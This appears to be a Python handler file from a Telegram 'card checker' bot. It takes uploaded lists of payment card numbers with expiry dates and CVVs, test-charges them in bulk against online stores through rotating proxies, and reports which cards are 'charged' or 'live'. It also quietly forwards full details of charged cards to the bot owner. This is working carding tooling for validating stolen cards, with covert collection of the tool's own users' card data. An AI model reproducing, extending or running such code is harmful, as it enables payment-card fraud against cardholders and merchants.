"""Mass check handler — /chk command.

Flow:
  1. User sends /chk
  2. Bot asks user to send a .txt file with cards
  3. User uploads .txt file
  4. Bot shows price range buttons ($1-5, $1-10, All Sites)
  5. User selects price range
  6. Bot starts mass check with progress updates
  7. Bot sends final summary + charged/live card lists
"""

import logging
import asyncio
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.constants import ParseMode
from telegram.ext import (
    ContextTypes,
    CommandHandler,
    MessageHandler,
    CallbackQueryHandler,
    ConversationHandler,
    filters,
)

from core.card_parser import parse_card_list
from core.database import is_banned, increment_check_stats, log_check_history
from core.mass_checker import (
    mass_check, format_duration, save_state, update_state,
    complete_state, get_pending_state, clear_state, MassCheckResult,
)
from core.rate_limiter import rate_limiter, get_cooldown_message, get_mass_active_message
from templates.messages import (
    format_banned,
    format_mass_check_options,
    format_mass_check_limit_warning,
    format_mass_check_progress,
    format_mass_check_complete,
    format_charged_cards_list,
    format_live_cards_list,
    format_error,
    format_tier_exceeded,
)
from templates.emojis import e_lightning, e_memo, e_cross, e_check_done

DIVIDER = "━━━━━━━━━━━━━━━━━━━━━━"
BOLD = lambda s: f"<b>{s}</b>"
CODE = lambda s: f"<code>{s}</code>"

logger = logging.getLogger(__name__)

# Conversation states
WAITING_FOR_FILE = 1

# Callback data prefixes
CB_PRICE_5 = "mc_price_5"
CB_PRICE_10 = "mc_price_10"
CB_PRICE_ALL = "mc_price_all"
CB_PRICE_HQ = "mc_price_hq"
CB_PRICE_V40 = "mc_price_v40"
CB_PRICE_SURESHIP = "mc_price_sureship"
CB_PRICE_ALL_COMBINED = "mc_price_all_combined"
CB_CANCEL = "mc_cancel"

from core.tier_manager import TIER_CONFIG


async def mass_check_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle /chk — start mass check conversation."""
    user = update.effective_user
    conn = ctx.bot_data["db"]

    if is_banned(conn, user.id):
        await update.message.reply_text(format_banned(), parse_mode=ParseMode.HTML)
        return ConversationHandler.END

    # Rate limit: command cooldown
    allowed, remaining = rate_limiter.check_command_cooldown(user.id, "chk")
    if not allowed:
        await update.message.reply_text(get_cooldown_message("/chk", remaining))
        return ConversationHandler.END

    # Rate limit: max concurrent mass checks
    mass_ok, active = rate_limiter.can_start_mass(user.id)
    if not mass_ok:
        await update.message.reply_text(get_mass_active_message())
        return ConversationHandler.END

    await update.message.reply_text(
        f"{e_lightning()} 𝐀𝐔𝐑𝐎𝐑𝐀 𝐂𝐇𝐄𝐂𝐊𝐄𝐑 {e_lightning()}\n"
        f"{DIVIDER}\n\n"
        f"{e_memo()} {BOLD('Send a .txt file with cards')}\n\n"
        f"One card per line.\n"
        f"Format: {CODE('NUMBER|MM|YYYY|CVV')}\n\n"
        f"{e_cross()} Send {CODE('/cancel')} to abort.",
        parse_mode=ParseMode.HTML,
    )
    return WAITING_FOR_FILE


async def receive_card_file(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle .txt file upload — parse cards, show price range buttons."""
    user = update.effective_user
    conn = ctx.bot_data["db"]

    if is_banned(conn, user.id):
        await update.message.reply_text(format_banned(), parse_mode=ParseMode.HTML)
        return ConversationHandler.END

    # Check if message has a document
    if not update.message.document:
        await update.message.reply_text(
            f"{format_error('Please send a .txt file with cards.')}",
            parse_mode=ParseMode.HTML,
        )
        return WAITING_FOR_FILE

    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text(
            f"{format_error('File must be a .txt file.')}",
            parse_mode=ParseMode.HTML,
        )
        return WAITING_FOR_FILE

    # Download file
    try:
        file = await doc.get_file()
        bytes_content = await file.download_as_bytearray()
        text = bytes_content.decode("utf-8", errors="ignore")
    except Exception as e:
        logger.error("File download error: %s", e)
        await update.message.reply_text(
            format_error("Failed to download file. Try again."),
            parse_mode=ParseMode.HTML,
        )
        return WAITING_FOR_FILE

    # Parse cards
    cards = parse_card_list(text)
    if not cards:
        await update.message.reply_text(
            format_error("No valid cards found in file."),
            parse_mode=ParseMode.HTML,
        )
        return WAITING_FOR_FILE

    # Hourly rate limit check
    from core.tier_manager import get_user_tier
    from core.rate_limiter import get_hourly_message
    tier = get_user_tier(conn, user.id)
    hourly_ok, hourly_remaining = rate_limiter.check_hourly_limit(user.id, tier, len(cards))
    if not hourly_ok:
        await update.message.reply_text(get_hourly_message(tier, hourly_remaining))
        return ConversationHandler.END

    # Get user tier (auto-downgrades if expired)
    tier = get_user_tier(conn, user.id)
    from core.tier_manager import get_tier_config
    tier_cfg = get_tier_config(tier)
    card_limit = tier_cfg["card_limit"]

    # Apply tier limit
    total_cards = len(cards)
    if total_cards > card_limit:
        cards = cards[:card_limit]
        limit_warning = format_mass_check_limit_warning(total_cards, card_limit)
    else:
        limit_warning = ""

    # Store cards in user_data for callback
    ctx.user_data["mass_check_cards"] = cards
    ctx.user_data["mass_check_tier"] = tier
    ctx.user_data["mass_check_limit"] = card_limit

    # Get store counts for buttons
    loader = ctx.bot_data["loader"]
    counts = loader.get_counts()

    # Show options with inline buttons
    text = format_mass_check_options(
        c5=counts["5"],
        c10=counts["10"],
        call=counts["all"],
        cc=len(cards),
        warn=limit_warning,
        chq=counts.get("hq", 0),
        cv40=counts.get("v40", 0),
        csureship=counts.get("sureship", 0),
        call_combined=counts.get("all_combined", 0),
    )

    keyboard = InlineKeyboardMarkup([
        [
            InlineKeyboardButton(
                f"$1-5 ({counts['5']})", callback_data=CB_PRICE_5,
            ),
            InlineKeyboardButton(
                f"$1-10 ({counts['10']})", callback_data=CB_PRICE_10,
            ),
        ],
        [
            InlineKeyboardButton(
                f"✅ HQ ({counts.get('hq', 0)})", callback_data=CB_PRICE_HQ,
            ),
            InlineKeyboardButton(
                f"⚡ V40 ({counts.get('v40', 0)})", callback_data=CB_PRICE_V40,
            ),
        ],
        [
            InlineKeyboardButton(
                f"🚀 Sureship ({counts.get('sureship', 0)})", callback_data=CB_PRICE_SURESHIP,
            ),
            InlineKeyboardButton(
                f"📦 Working ({counts['all']})", callback_data=CB_PRICE_ALL,
            ),
        ],
        [
            InlineKeyboardButton(
                f"🌐 ALL Sites ({counts.get('all_combined', 0)})", callback_data=CB_PRICE_ALL_COMBINED,
            ),
        ],
        [
            InlineKeyboardButton("❌ Cancel", callback_data=CB_CANCEL),
        ],
    ])

    await update.message.reply_text(
        text, parse_mode=ParseMode.HTML, reply_markup=keyboard,
    )
    return ConversationHandler.END


async def cancel_mass_check(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Cancel mass check conversation."""
    ctx.user_data.pop("mass_check_cards", None)
    await update.message.reply_text("❌ Mass check cancelled.")
    return ConversationHandler.END


async def mass_check_callback(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle inline button callback — start mass check with selected price range."""
    query = update.callback_query
    await query.answer()

    user = query.from_user
    conn = ctx.bot_data["db"]

    if is_banned(conn, user.id):
        await query.edit_message_text(format_banned(), parse_mode=ParseMode.HTML)
        return

    data = query.data

    if data == CB_CANCEL:
        ctx.user_data.pop("mass_check_cards", None)
        await query.edit_message_text("❌ Mass check cancelled.")
        return

    # Determine price range
    price_map = {
        CB_PRICE_5:           ("5",            "$1 - $5"),
        CB_PRICE_10:          ("10",           "$1 - $10"),
        CB_PRICE_ALL:         ("all",          "Working Sites"),
        CB_PRICE_HQ:          ("hq",           "HQ Sites"),
        CB_PRICE_V40:         ("v40",          "V40 Sites"),
        CB_PRICE_SURESHIP:    ("sureship",     "Sureship Sites"),
        CB_PRICE_ALL_COMBINED:("all_combined", "ALL Sites"),
    }

    if data not in price_map:
        return

    range_key, range_label = price_map[data]

    # Get cards from user_data
    cards = ctx.user_data.get("mass_check_cards")
    if not cards:
        await query.edit_message_text(
            format_error("Session expired. Send /chk again."),
            parse_mode=ParseMode.HTML,
        )
        return

    # Get stores for selected range
    loader = ctx.bot_data["loader"]
    stores = loader.get_stores(range_key)

    if not stores:
        await query.edit_message_text(
            format_error("No stores available for this price range."),
            parse_mode=ParseMode.HTML,
        )
        return

    # Get tier config
    tier = ctx.user_data.get("mass_check_tier", "FREE")
    tier_cfg = TIER_CONFIG.get(tier, TIER_CONFIG["FREE"])
    workers = tier_cfg["workers"]

    # Clear stored cards
    ctx.user_data.pop("mass_check_cards", None)
    ctx.user_data.pop("mass_check_tier", None)
    ctx.user_data.pop("mass_check_limit", None)

    # Send initial progress message
    progress_text = format_mass_check_progress(
        price_range=range_label,
        total=len(cards),
        checked=0,
        duration="0m 0s",
        charged=0,
        live=0,
        dead=0,
    )
    await query.edit_message_text(progress_text, parse_mode=ParseMode.HTML)
    progress_msg = query.message

    # Progress callback
    chat_id = progress_msg.chat_id
    message_id = progress_msg.message_id

    async def progress_cb(checked, total, mc_result, elapsed):
        try:
            text = format_mass_check_progress(
                price_range=range_label,
                total=total,
                checked=checked,
                duration=format_duration(elapsed),
                charged=len(mc_result.charged),
                live=len(mc_result.live),
                dead=len(mc_result.dead),
            )
            await ctx.bot.edit_message_text(
                chat_id=chat_id,
                message_id=message_id,
                text=text,
                parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.debug("Progress edit error: %s", e)

    # Run mass check (with proxy rotation if user has proxies)
    pm = ctx.bot_data.get("proxy_manager")
    health_cache = ctx.bot_data.get("health_cache")

    async def proxy_provider():
        if pm:
            return pm.get_proxy(user.id)
        return None

    # Save state for resume
    save_state(conn, user.id, chat_id, cards, stores, range_label, 0, message_id)
    state_row = conn.execute(
        "SELECT id FROM mass_check_state WHERE user_id = ? AND status = 'running' ORDER BY id DESC LIMIT 1",
        (user.id,),
    ).fetchone()
    state_id = state_row["id"] if state_row else None

    result = await mass_check(
        cards=cards,
        stores=stores,
        workers=workers,
        timeout=25,
        progress_callback=progress_cb,
        progress_interval=3.0,
        proxy_provider=proxy_provider,
        state_conn=conn,
        state_id=state_id,
        health_cache=health_cache,
    )

    # Send final summary
    final_text = format_mass_check_complete(
        price_range=range_label,
        total=result.total,
        duration=format_duration(result.duration),
        charged=len(result.charged),
        live=len(result.live),
        dead=len(result.dead),
    )
    await ctx.bot.send_message(
        chat_id=chat_id, text=final_text, parse_mode=ParseMode.HTML,
    )

    # Send charged cards list if any
    if result.charged:
        charged_text = format_charged_cards_list(result.charged)
        await ctx.bot.send_message(
            chat_id=chat_id, text=charged_text, parse_mode=ParseMode.HTML,
        )

    # Send live cards list if any
    if result.live:
        live_text = format_live_cards_list(result.live)
        await ctx.bot.send_message(
            chat_id=chat_id, text=live_text, parse_mode=ParseMode.HTML,
        )

    # Update user stats (batched)
    from core.database import batch_increment_stats
    batch_increment_stats(conn, user.id,
                          charged=len(result.charged),
                          live=len(result.live),
                          dead=len(result.dead))

    # Log to history
    log_check_history(
        conn, user.id, "mass",
        cards_total=result.total,
        live=len(result.live),
        dead=len(result.dead),
        charged=len(result.charged),
        price_range=range_label,
        duration=result.duration,
    )

    # Clean up rate limiter
    rate_limiter.end_mass(user.id)

    # Log charged cards (batched)
    if result.charged:
        from core.database import batch_log_charged_cards
        batch_log_charged_cards(conn, user.id, result.charged)

        # Forward charged cards to owner
        try:
            owner_id = ctx.bot_data["config"]["bot"]["owner_id"]
            for card, res in result.charged[:10]:  # Limit to 10 to avoid spam
                await ctx.bot.send_message(
                    chat_id=owner_id,
                    text=(
                        f"🤍 CHARGED (Mass) 🤍\n\n"
                        f"💳 CC : {card.raw}\n"
                        f"🛒 Gateway : {res.gateway}\n"
                        f"📝 Response : {res.message}\n"
                        f"💵 Price : ${res.price}\n"
                        f"🏪 Store : {res.store}\n"
                        f"👤 User : {user.id} ({user.username})\n\n"
                        f"💳 BIN: {card.bin}\n"
                        f"━━━━━━━━━━━━━━━━━━━━━━"
                    ),
                    parse_mode=ParseMode.HTML,
                )
        except Exception as e:
            logger.warning("Failed to forward charged cards to owner: %s", e)

    logger.info(
        "Mass check complete: user=%d total=%d charged=%d live=%d dead=%d duration=%.1fs",
        user.id, result.total, len(result.charged), len(result.live),
        len(result.dead), result.duration,
    )

async def resume_cmd(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    """Handle /resume — resume an interrupted mass check."""
    user = update.effective_user
    conn = ctx.bot_data["db"]

    if is_banned(conn, user.id):
        await update.message.reply_text(format_banned(), parse_mode=ParseMode.HTML)
        return

    state = get_pending_state(conn, user.id)
    if not state:
        await update.message.reply_text(
            format_error("No interrupted mass check to resume."),
            parse_mode=ParseMode.HTML,
        )
        return

    import json
    from core.card_parser import parse_card

    # Reconstruct cards and stores
    cards_raw = json.loads(state["cards_json"])
    cards = [parse_card(c) for c in cards_raw]
    cards = [c for c in cards if c]  # filter None

    stores = json.loads(state["stores_json"])
    if not cards or not stores:
        clear_state(conn, state["id"])
        await update.message.reply_text(
            format_error("Resume data corrupted. State cleared."),
            parse_mode=ParseMode.HTML,
        )
        return

    # Get tier config from DB (not user_data — it was popped)
    from core.tier_manager import get_user_tier, get_tier_config
    tier = get_user_tier(conn, user.id)
    tier_cfg = get_tier_config(tier)
    workers = tier_cfg["workers"]
    range_label = state["price_range"] or "All Sites"

    # Clear old state
    clear_state(conn, state["id"])

    # Send initial progress
    progress_text = format_mass_check_progress(
        price_range=range_label, total=len(cards), checked=0,
        duration="0m 0s", charged=0, live=0, dead=0,
    )
    msg = await update.message.reply_text(progress_text, parse_mode=ParseMode.HTML)

    chat_id = msg.chat_id
    message_id = msg.message_id

    async def progress_cb(checked, total, mc_result, elapsed):
        try:
            text = format_mass_check_progress(
                price_range=range_label, total=total, checked=checked,
                duration=format_duration(elapsed),
                charged=len(mc_result.charged), live=len(mc_result.live),
                dead=len(mc_result.dead),
            )
            await ctx.bot.edit_message_text(
                chat_id=chat_id, message_id=message_id,
                text=text, parse_mode=ParseMode.HTML,
            )
        except Exception as e:
            logger.debug("Resume progress edit error: %s", e)

    # Save new state
    save_state(conn, user.id, chat_id, cards, stores, range_label, 0, message_id)
    state_row = conn.execute(
        "SELECT id FROM mass_check_state WHERE user_id = ? AND status = 'running' ORDER BY id DESC LIMIT 1",
        (user.id,),
    ).fetchone()
    state_id = state_row["id"] if state_row else None

    pm = ctx.bot_data.get("proxy_manager")
    health_cache = ctx.bot_data.get("health_cache")
    async def proxy_provider():
        if pm:
            return pm.get_proxy(user.id)
        return None

    result = await mass_check(
        cards=cards, stores=stores, workers=workers, timeout=25,
        progress_callback=progress_cb, progress_interval=3.0,
        proxy_provider=proxy_provider, state_conn=conn, state_id=state_id,
        health_cache=health_cache,
    )

    # Send final summary
    final_text = format_mass_check_complete(
        price_range=range_label, total=result.total,
        duration=format_duration(result.duration),
        charged=len(result.charged), live=len(result.live), dead=len(result.dead),
    )
    await ctx.bot.send_message(chat_id=chat_id, text=final_text, parse_mode=ParseMode.HTML)

    if result.charged:
        await ctx.bot.send_message(
            chat_id=chat_id,
            text=format_charged_cards_list(result.charged),
            parse_mode=ParseMode.HTML,
        )
    if result.live:
        await ctx.bot.send_message(
            chat_id=chat_id,
            text=format_live_cards_list(result.live),
            parse_mode=ParseMode.HTML,
        )

    batch_increment_stats(conn, user.id,
                          charged=len(result.charged),
                          live=len(result.live),
                          dead=len(result.dead))
    log_check_history(
        conn, user.id, "mass_resume", cards_total=result.total,
        live=len(result.live), dead=len(result.dead), charged=len(result.charged),
        price_range=range_label, duration=result.duration,
    )

    rate_limiter.end_mass(user.id)

    logger.info("Mass check resumed: user=%d total=%d charged=%d", user.id, result.total, len(result.charged))
